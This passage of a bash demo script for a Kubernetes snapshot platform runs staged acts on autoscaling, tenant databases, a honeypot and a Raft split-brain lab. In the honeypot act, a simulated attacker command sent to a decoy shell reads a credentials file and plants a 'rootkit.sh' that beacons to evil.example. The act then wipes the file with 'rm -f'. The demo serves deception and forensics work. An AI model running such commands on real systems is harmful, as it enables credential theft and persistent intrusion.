  kubectl rollout status deployment/coldstart-k8s -n anything-but-agents --timeout=120s
  kubectl rollout status deployment/coldstart-k8s-router -n anything-but-agents --timeout=120s
  kubectl rollout status deployment/coldstart-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc coldstart-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Cold-Start HPA Dashboard (HTTPS) : https://coldstart.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Cold-Start HPA Dashboard (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
  kubectl get hpa -n anything-but-agents
}

cleanup_coldstart_hpa() {
  banner "Cleaning up Cold-Start HPA Comparison Stack & Actors"
  for act in coldstart-1 coldstart-2 coldstart-3 clone-1 clone-2 clone-3; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete hpa coldstart-k8s coldstart-substrate -n anything-but-agents --ignore-not-found
  kubectl delete deployment,service coldstart-k8s coldstart-k8s-router coldstart-gateway -n anything-but-agents --ignore-not-found
  kubectl delete secret coldstart-gateway -n anything-but-agents --ignore-not-found
  kubectl delete deployment coldstart-substrate-pool -n anything-but-agents --ignore-not-found
  kubectl delete serviceaccount,role,rolebinding coldstart-gateway coldstart-gateway-ns -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding coldstart-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding coldstart-gateway-cluster coldstart-gateway-auth-delegator --ignore-not-found
  kubectl delete apiservice v1beta1.external.metrics.k8s.io --ignore-not-found
  free_workers '^(coldstart|clone)-'
}

act2_coldstart() {
  ensure_router_port_forward
  banner "ACT II: 'The Instant Cloner & Production HPA QPS Race' — 12s Cold-Start Index vs. 100ms Golden Snapshot Clones"
  reset_act_resources clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3

  step "1. Create 3 search engine actors from 'coldstart' template (whose Golden Snapshot already built the 50,000-doc trigram index in 12s)"
  run_cmd kubectl ate create actor coldstart-1 -a "${ATESPACE}" --template coldstart
  run_cmd kubectl ate create actor coldstart-2 -a "${ATESPACE}" --template coldstart
  run_cmd kubectl ate create actor coldstart-3 -a "${ATESPACE}" --template coldstart

  step "2. Query coldstart-1 & coldstart-2 — both wake in ~100ms with the SAME golden_heap_fingerprint, 50,000 indexed docs (~65MB RAM), and isolated overlays!"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/coldstart-1" "${ROUTER_URL}/search?q=kubernetes+horizontal+pod+autoscaler&add_symbol=user_a_module"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/coldstart-2" "${ROUTER_URL}/search?q=gvisor+memory+snapshot+restore&add_symbol=user_b_module"

  step "3. Suspend coldstart-2 and coldstart-3 to GCS (\$0 idle compute) so our HPA pool starts at 1/3 active replicas (20 QPS capacity)"
  run_cmd kubectl ate suspend actor coldstart-2 -a "${ATESPACE}"
  run_cmd kubectl ate suspend actor coldstart-3 -a "${ATESPACE}"

  local cs_port="${COLDSTART_PORT:-8091}"
  local cs_url="http://localhost:${cs_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret coldstart-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(openssl rand -hex 24)"
  fi
  cluster_lb_ip="$(kubectl get svc coldstart-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    cs_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Cold-Start HPA & Production QPS Comparison Gateway at ${cs_url}..."
  else
    echo "Starting Cold-Start HPA & Production QPS Comparison Gateway on ${cs_url}..."
    (
      cd "${REPO_ROOT}"
      PRESENTER_TOKEN="${presenter_token}" go run ./cmd/coldstart \
        --mode=gateway \
        --addr=":${cs_port}" \
        --metrics-addr="" \
        --atespace="${ATESPACE}" \
        --template=coldstart \
        --router-url="${ROUTER_URL}" \
        --init-delay=12s \
        --min-query-duration=200ms \
        --max-concurrent=4 >/dev/null 2>&1
    ) &
    GATEWAY_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT

    for _ in {1..40}; do
      if curl -s -o /dev/null --connect-timeout 1 "${cs_url}/readyz" 2>/dev/null; then
        break
      fi
      sleep 0.3
    done
  fi

  echo ""
  echo "  Live HPA & Production QPS Dashboard : ${cs_url}/dashboard?key=${presenter_token}"
  echo ""

  step "4. PRODUCTION HPA QPS RACE: Trigger a 60 QPS Traffic Spike (minReplicas: 1 -> maxReplicas: 3, 20 QPS/replica cap)"
  curl -fsS -H "X-Presenter-Key: ${presenter_token}" -X POST "${cs_url}/api/spike?baseline_qps=15&spike_qps=60&baseline_sec=2&spike_sec=18&cooldown_sec=2" >/dev/null

  printf "\n  %-4s | %-22s | %-18s | %-20s | %-18s | %-20s\n" \
    "SEC" "PHASE (DEMAND)" "K8S HPA (READY)" "K8S GOODPUT / SHED" "SUB HPA (ACTIVE)" "SUB GOODPUT / SHED"
  printf "  %s\n" "------------------------------------------------------------------------------------------------------------------------"

  for ((sec = 1; sec <= 21; sec++)); do
    sleep 1
    local snap
    snap="$(curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${cs_url}/api/state" 2>/dev/null || true)"
    if [[ -n "${snap}" ]]; then
      local phase k8s_des k8s_rdy k8s_good k8s_shed sub_des sub_rdy sub_good sub_shed
      phase="$(awk -F'"' '/"scenario_phase":/ {print $4; exit}' <<< "${snap}")"
      k8s_des="$(awk '/"hpa_desired_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      k8s_rdy="$(awk '/"ready_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      k8s_good="$(awk '/"goodput_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      k8s_shed="$(awk '/"shed_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_des="$(awk '/"substrate":/ {in_sub=1} in_sub && /"hpa_desired_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_rdy="$(awk '/"substrate":/ {in_sub=1} in_sub && /"ready_replicas":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_good="$(awk '/"substrate":/ {in_sub=1} in_sub && /"goodput_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      sub_shed="$(awk '/"substrate":/ {in_sub=1} in_sub && /"shed_qps":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${snap}")"
      printf "  %2ds  | %-22s | %s/%s Ready (%2d QPS) | %5s OK / %5s 429 | %s/%s Ready (%2d QPS) | %5s OK / %5s 429\n" \
        "${sec}" "${phase}" \
        "${k8s_rdy:-1}" "${k8s_des:-1}" "$(( ${k8s_rdy:-1} * 20 ))" "${k8s_good:-0}" "${k8s_shed:-0}" \
        "${sub_rdy:-1}" "${sub_des:-1}" "$(( ${sub_rdy:-1} * 20 ))" "${sub_good:-0}" "${sub_shed:-0}"
    fi
  done

  echo ""
  local final_snap k8s_tot sub_tot k8s_drop sub_drop mult extra
  final_snap="$(curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${cs_url}/api/state" 2>/dev/null || true)"
  k8s_tot="$(awk '/"total_goodput":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  k8s_drop="$(awk '/"total_shed":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  sub_tot="$(awk '/"substrate":/ {in_sub=1} in_sub && /"total_goodput":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  sub_drop="$(awk '/"substrate":/ {in_sub=1} in_sub && /"total_shed":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  mult="$(awk '/"goodput_multiplier":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"
  extra="$(awk '/"extra_queries_served":/ {gsub(/,/,"",$2); print $2; exit}' <<< "${final_snap}")"

  echo "  ================================================================================"
  echo "  PRODUCTION HPA + COLD-START SCORECARD (minReplicas: 1 -> maxReplicas: 3)"
  echo "  --------------------------------------------------------------------------------"
  echo "  Standard K8s HPA (12s Cold-Start Pods) : ${k8s_tot:-0} searches served (200 OK) | ${k8s_drop:-0} shed (429)"
  echo "  Agent Substrate HPA (~100ms Snapshot)  : ${sub_tot:-0} searches served (200 OK) | ${sub_drop:-0} shed (429)"
  echo "  Production QPS Advantage               : ${mult:-1.0}x effective goodput (+${extra:-0} extra queries served!)"
  echo "  ================================================================================"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Cold-Start HPA Dashboard (${cs_url}/dashboard?key=${presenter_token}) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${GATEWAY_PID:-}" 2>/dev/null || true
  free_workers '^(coldstart|clone)-'
}

act3_tenantdb() {
  ensure_router_port_forward
  banner "ACT III: 'One Database Per Customer' — DurableDir + 16MB Hot RAM Pause (FULL) vs. Compact GCS Commit (DATA)"
  reset_act_resources db-acme db-globex db-initech db-umbrella

  local tdb_port="${TENANTDB_PORT:-8086}"
  local tdb_url="http://localhost:${tdb_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  cluster_lb_ip="$(kubectl get svc tenantdb-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    tdb_url="http://${cluster_lb_ip}"
    echo "Using in-cluster TenantDB Storage & Memory Tiering Console at ${tdb_url}..."
  else
    echo "Starting TenantDB Storage & Memory Tiering Console on ${tdb_url}..."
    (
      cd "${REPO_ROOT}"
      PRESENTER_TOKEN="${presenter_token}" go run ./cmd/tenantdb \
        --mode=gateway \
        --addr=":${tdb_port}" \
        --atespace="${ATESPACE}" \
        --template=tenantdb \
        --router-url="${ROUTER_URL}" >/dev/null 2>&1
    ) &
    TENANTDB_GW_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${TENANTDB_GW_PID:-}" 2>/dev/null || true' EXIT

    for _ in {1..30}; do
      if curl -s -o /dev/null --connect-timeout 1 "${tdb_url}/readyz" 2>/dev/null; then
        break
      fi
      sleep 0.3
    done
  fi

  echo ""
  if [[ -n "${presenter_token}" ]]; then
    echo "  TenantDB Storage & Memory X-Ray Console : ${tdb_url}/dashboard?key=${presenter_token}"
  else
    echo "  TenantDB Storage & Memory X-Ray Console : ${tdb_url}/dashboard"
  fi
  echo ""

  step "1. Create isolated single-tenant database actors: 'db-acme' (Acme Corp) and 'db-globex' (Globex Logistics)"
  run_cmd kubectl ate create actor db-acme -a "${ATESPACE}" --template tenantdb
  run_cmd kubectl ate create actor db-globex -a "${ATESPACE}" --template tenantdb

  step "2. Insert SaaS rows into both tenants' DurableDir (/data/wal.jsonl) and warm their 16.0 MB RAM Buffer Pools"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?table=subscriptions&key=tier&val=enterprise&amount=48000"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?table=settings&key=region&val=us-west3-slc"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-globex" "${ROUTER_URL}/?table=subscriptions&key=tier&val=freight-scale&amount=32000"

  step "3. PAUSE db-acme (suspend --mode=async) -> query it: HOT_RAM_RESUME! Both /data/wal.jsonl AND 16.0 MB RAM Buffer Pool survive intact (0 WAL replayed)"
  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}" --mode=async
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/"

  step "4. SUSPEND db-acme (suspend --mode=sync) -> query it: COLD_DATA_REPLAY! 16.0 MB RAM heap discarded (99.997% GCS saved); /data/wal.jsonl replayed in <1ms"
  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}" --mode=sync
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?resume_hint=suspend_data"

  step "5. GDPR Article 17 Right-to-be-Forgotten: delete tenant 'db-acme' in 1 command, then verify sibling 'db-globex' is 100% intact!"
  run_cmd kubectl ate delete actor db-acme -a "${ATESPACE}"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-globex" "${ROUTER_URL}/"

  echo ""
  echo "  ================================================================================"
  echo "  PER-TENANT DATABASE STORAGE TIERING & GDPR SCORECARD"
  echo "  --------------------------------------------------------------------------------"
  echo "  Short Idle (onPause: FULL)   : 16.0 MB Hot RAM Buffer Pool + /data/wal.jsonl intact (0 WAL replayed)"
  echo "  Long Idle  (onCommit: DATA)  : 16.0 MB RAM discarded; ~320 B /data/wal.jsonl committed (99.997% GCS saved)"
  echo "  GDPR Right-to-be-Forgotten   : 'db-acme' compute + snapshots + DurableDir shredded; 'db-globex' 100% online"
  echo "  ================================================================================"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> TenantDB Storage & Memory Tiering Console (${tdb_url}/dashboard) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${TENANTDB_GW_PID:-}" 2>/dev/null || true
  free_workers '^db-'
}

deploy_tenantdb_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster TenantDB Storage & Memory Tiering Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  reset_act_resources db-acme db-globex db-initech db-umbrella
  free_workers '^db-'
  ensure_presenter_auth

  ensure_template_ready tenantdb
  ensure_template_ready tenantdb-volumes
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/tenantdb-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/tenantdb-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc tenantdb-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  TenantDB Storage X-Ray Console (HTTPS) : https://tenantdb.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  TenantDB Storage X-Ray Console (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret tenantdb-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_tenantdb_gateway() {
  banner "Cleaning up TenantDB Gateway Deployment & Actors"
  for act in db-acme db-globex db-initech db-umbrella; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount tenantdb-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding tenantdb-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding tenantdb-gateway-ate-client --ignore-not-found
  free_workers '^db-'
}

act4_honeypot() {
  ensure_router_port_forward
  banner "ACT IV: 'The Truman Show Honeypot' — On-Demand Per-Attacker gVisor Deception"
  reset_act_resources honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab
  kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true

  local honeypot_port="${HONEYPOT_PORT:-8084}"
  local honeypot_url="http://localhost:${honeypot_port}"
  local presenter_token=""
  presenter_token="$(kubectl get secret honeypot-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"

  echo "Starting Truman Show Split-Screen Honeypot UI on ${honeypot_url}..."
  (
    cd "${REPO_ROOT}"
    PRESENTER_TOKEN="${presenter_token}" go run ./cmd/honeypot \
      --mode=gateway \
      --addr=":${honeypot_port}" \
      --atespace="${ATESPACE}" \
      --template=honeypot \
      --router-url="${ROUTER_URL}" >/dev/null 2>&1
  ) &
  HONEYPOT_GW_PID=$!
  trap 'kill "${PORT_FORWARD_PID:-}" "${HONEYPOT_GW_PID:-}" 2>/dev/null || true' EXIT

  echo ""
  if [[ -n "${presenter_token}" ]]; then
    echo "  Split-Screen Truman Show Director's Booth : ${honeypot_url}/?key=${presenter_token}"
  else
    echo "  Split-Screen Truman Show Director's Booth : ${honeypot_url}/"
  fi
  echo ""

  step "1. Create gVisor honeypot actors for two suspicious scanner IPs and attach deny-by-default EgressPolicy"
  run_cmd kubectl ate create actor honeypot-203-0-113-5 -a "${ATESPACE}" --template honeypot
  run_cmd kubectl ate create egress-policy honeypot-203-0-113-5 -a "${ATESPACE}" -f "${REPO_ROOT}/manifests/honeypot-egress-policy.yaml.tmpl"
  run_cmd kubectl ate create actor honeypot-198-51-100-9 -a "${ATESPACE}" --template honeypot
  run_cmd kubectl ate create egress-policy honeypot-198-51-100-9 -a "${ATESPACE}" -f "${REPO_ROOT}/manifests/honeypot-egress-policy.yaml.tmpl"

  step "2. Attacker 203.0.113.5 exploits /shell (real sh in gVisor), steals decoy DB creds, and plants /tmp/honeypot/rootkit.sh"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" \
    "${ROUTER_URL}/shell?cmd=id+%26%26+cat+payroll_db_credentials.env.bak+%26%26+echo+'curl+evil.example/beacon'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh+%26%26+ls+-la"

  step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS (checkpointing rootkit.sh + RAM forensics at \$0 idle compute)"
  run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}" --mode=sync

  step "4. Meanwhile, Attacker 198.51.100.9 probes /shell and sees a completely clean Golden Snapshot filesystem"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-198-51-100-9" "${ROUTER_URL}/shell?cmd=ls+-la"

  step "5. Weeks later, Attacker 203.0.113.5 returns (rootkit.sh is still there!) and runs 'rm -f rootkit.sh' to wipe their tracks"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/shell?cmd=ls+-la+%26%26+rm+-f+rootkit.sh+%26%26+ls+-la"

  step "6. SOC Director Reveal: inspect /forensics (Canary Alerts + DELETED rootkit.sh), then REVERT the rm -f wipe to recover the malware!"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/forensics"
  run_cmd kubectl ate revert actor honeypot-203-0-113-5 -a "${ATESPACE}"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/forensics"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Truman Show Split-Screen UI (${honeypot_url}) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${HONEYPOT_GW_PID:-}" 2>/dev/null || true
  free_workers '^honeypot-'
}

deploy_honeypot_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Honeypot Split-Screen Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  if [[ "${FORCE_REBUILD_TEMPLATES:-0}" == "1" ]]; then
    for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^honeypot-/ {print $2}' || true); do
      kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
    done
    for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-(honeypot|forensic)/ {print $2}' || true); do
      kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
    done
  fi
  free_workers '^honeypot-'
  ensure_presenter_auth

  kubectl create secret generic payroll-vault-api \
    -n anything-but-agents \
    --from-literal=token="decoysupersecret-payroll-vault-2026" \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null

  # Ensure ActorTemplate honeypot is rebuilt and Golden Snapshot is READY
  ensure_template_ready honeypot
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/honeypot-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/honeypot-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc honeypot-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Truman Show Honeypot UI (HTTPS) : https://honeypot.${DEMO_DOMAIN}/?key=\$(kubectl get secret honeypot-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Truman Show Honeypot UI (LB IP) : http://${lb_ip:-<pending>}/?key=\$(kubectl get secret honeypot-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_honeypot_gateway() {
  banner "Cleaning up Honeypot Gateway Deployment & Actors"
  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^honeypot-/ {print $2}' || true); do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-(honeypot|forensic)/ {print $2}' || true); do
    kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount honeypot-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding honeypot-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding honeypot-gateway-ate-client --ignore-not-found
  free_workers '^honeypot-'
}

act5_timewarp() {
  ensure_router_port_forward
  banner "ACT V: 'Don't Try This at Home' — 3-Node Raft Split-Brain & Dual-Clock Time-Jump Lab"
  reset_act_resources raft-leader-1 raft-node-1 raft-node-2 raft-node-3

  local tw_port="${TIMEWARP_PORT:-8085}"
  local tw_url="http://localhost:${tw_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret timewarp-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  cluster_lb_ip="$(kubectl get svc timewarp-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    tw_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Chronos Split-Brain & Dual-Clock Lab Gateway at ${tw_url}..."
  else
    echo "Starting Chronos Split-Brain & Dual-Clock Lab Gateway on ${tw_url}..."
    (
      cd "${REPO_ROOT}"
      PRESENTER_TOKEN="${presenter_token}" go run ./cmd/timewarp \
        --mode=gateway \
        --addr=":${tw_port}" \
        --atespace="${ATESPACE}" \
        --template=timewarp \
        --router-url="${ROUTER_URL}" >/dev/null 2>&1
    ) &
    TIMEWARP_GW_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${TIMEWARP_GW_PID:-}" 2>/dev/null || true' EXIT
  fi

  echo ""
  if [[ -n "${presenter_token}" ]]; then
    echo "  Chronos Split-Brain & Dual-Clock Lab UI : ${tw_url}/dashboard?key=${presenter_token}"
  else
    echo "  Chronos Split-Brain & Dual-Clock Lab UI : ${tw_url}/dashboard"
  fi
  echo ""

  step "1. Create 3 consensus actors (raft-node-1..3), elect raft-node-1 as Term 1 LEADER (3s lease), and grant Lock #101 to 'Alice'"
  run_cmd kubectl ate create actor raft-node-1 -a "${ATESPACE}" --template timewarp
  run_cmd kubectl ate create actor raft-node-2 -a "${ATESPACE}" --template timewarp
  run_cmd kubectl ate create actor raft-node-3 -a "${ATESPACE}" --template timewarp
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/raft/promote?node_name=raft-node-1&role=LEADER&term=1&leader_id=raft-node-1"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/lock/acquire?owner=Alice+(checkout-svc)&token=101"

  step "2. Suspend Term 1 Leader 'raft-node-1' to GCS for 5 seconds (0 CPU instructions executed; 3s lease expires in the real world!)"
  run_cmd kubectl ate suspend actor raft-node-1 -a "${ATESPACE}" --mode=sync
  echo "Sleeping 5 seconds while raft-node-1 is frozen in GCS — surviving quorum (raft-node-2, raft-node-3) elects raft-node-2 as Term 2 LEADER..."
  sleep 5
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-2" "${ROUTER_URL}/raft/promote?node_name=raft-node-2&role=LEADER&term=2&leader_id=raft-node-2"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-2" "${ROUTER_URL}/lock/acquire?owner=Bob+(inventory-svc)&token=102"

  step "3. Wake frozen 'raft-node-1' via atenet with a conflicting write ('Mallory') -> ZOMBIE LEADER SPLIT-BRAIN & +500 TOKEN BURST!"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/lock/acquire?owner=Mallory+(rogue-worker)&token=101"

  step "4. Enable Wakeup Clock-Jump Guardrail (?guard=true) -> fences stale lease (409 Conflict) and clamps rate-limiter delta!"
  run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/config?guard=true"

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Chronos Split-Brain & Dual-Clock Lab UI (${tw_url}/dashboard) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${TIMEWARP_GW_PID:-}" 2>/dev/null || true
  free_workers '^raft-'
}

deploy_timewarp_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Time-Warp Split-Brain & Dual-Clock Lab Gateway & LoadBalancer"
  reset_act_resources raft-leader-1 raft-node-1 raft-node-2 raft-node-3
  free_workers '^raft-'

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  ensure_presenter_auth

  ensure_template_ready timewarp
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/timewarp-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/timewarp-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc timewarp-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Chronos Split-Brain Lab UI (HTTPS) : https://timewarp.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret timewarp-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Chronos Split-Brain Lab UI (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret timewarp-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

deploy_gateway_tls() {
  detect_cluster_defaults
  banner "Deploying GKE Gateway API + Certificate Manager TLS (${SLIDES_DOMAIN} & *.${DEMO_DOMAIN})"

  envsubst < "${REPO_ROOT}/manifests/gateway-tls.yaml.tmpl" | kubectl apply -f -

  # Wildcard *.${DEMO_DOMAIN} only covers single-label subdomains (e.g. slides.${DEMO_DOMAIN}).
  # When SLIDES_DOMAIN uses nested labels (e.g. abs.slides.${DEMO_DOMAIN}), ensure a dedicated
  # LB-authorized Google-managed Certificate & Certificate Map Entry exist on ${CERT_MAP_NAME}.
  local slides_prefix="${SLIDES_DOMAIN%.${DEMO_DOMAIN}}"
  if [[ -n "${PROJECT_ID:-}" && "${SLIDES_DOMAIN}" != "${DEMO_DOMAIN}" && ( "${slides_prefix}" == "${SLIDES_DOMAIN}" || "${slides_prefix}" == *.* ) ]]; then
    local slug cert_name entry_name
    slug="$(tr '.:' '--' <<< "${SLIDES_DOMAIN}" | tr '[:upper:]' '[:lower:]' | cut -c1-48)"
    slug="${slug%-}"
